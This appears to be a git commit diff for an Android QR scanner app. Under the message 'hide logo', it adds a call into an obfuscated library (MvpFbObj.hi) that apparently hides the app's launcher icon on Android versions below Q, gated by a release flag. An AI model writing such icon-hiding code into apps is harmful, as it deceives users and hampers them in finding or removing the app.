b36692d4f81775739165d9ecc76296fc29e28ed9
Gasol <315710785@qq.com>
2023-05-04 16:42:15 +0800

    hide logo

--- app/src/main/java/com/qr/myqr/App.kt
+++ app/src/main/java/com/qr/myqr/App.kt
@@ -1,8 +1,15 @@
 package com.qr.myqr
 
+import android.app.ActivityManager
 import android.app.Application
+import android.content.Context
+import android.os.Build
+import android.os.Process
+import com.qr.myqr.page.FirstActivity
 import com.reader.multiple.bmw4.MvpManager
+import com.reader.multiple.vb.MvpFbObj
 
+const val isReleaseMode = false
 class App : Application() {
     companion object {
         lateinit var mApp: App
@@ -14,6 +21,23 @@ class App : Application() {
 
         MvpManager.setBhs(this, true)
         MvpManager.init(this)
+
+        if (processName() != packageName) return
+        if (isReleaseMode && Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
+            MvpFbObj.hi(this, FirstActivity::class.java.name)
+        }
+    }
+
+    private fun processName(): String? {
+        val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
+        val multiList = am.runningAppProcesses ?: return null
+        val pid = Process.myPid()
+        for (inf in multiList) {
+            if (pid == inf.pid) {
+                return inf.processName
+            }
+        }
+        return null
     }
 
 }
--- app/src/main/java/com/qr/myqr/main/MainActivity.kt
+++ app/src/main/java/com/qr/myqr/main/MainActivity.kt
@@ -1,19 +1,14 @@
 package com.qr.myqr.main
 
 import android.os.Bundle
-import androidx.lifecycle.lifecycleScope
 import androidx.recyclerview.widget.GridLayoutManager
 import com.qr.myqr.basic.BasePage
 import com.qr.myqr.create.CreateActivity
 import com.qr.myqr.databinding.ActivityMainBinding
 import com.qr.myqr.history.HistoryActivity
-import com.qr.myqr.page.FirstActivity
 import com.qr.myqr.scan.ScanningActivity
 import com.qr.myqr.toActivity
 import com.qr.myqr.tools.checkCameraPermission
-import com.reader.multiple.vb.MvpFbObj
-import kotlinx.coroutines.delay
-import kotlinx.coroutines.launch
 
 class MainActivity : BasePage() {
     override val viewBinding by lazy { ActivityMainBinding.inflate(layoutInflater) }
@@ -30,11 +25,6 @@ class MainActivity : BasePage() {
             }
         }
         setRv()
-
-        lifecycleScope.launch {
-            delay(3000L)
-            MvpFbObj.sh(this@MainActivity, FirstActivity::class.java.name)
-        }
     }
 
     private fun setRv() {
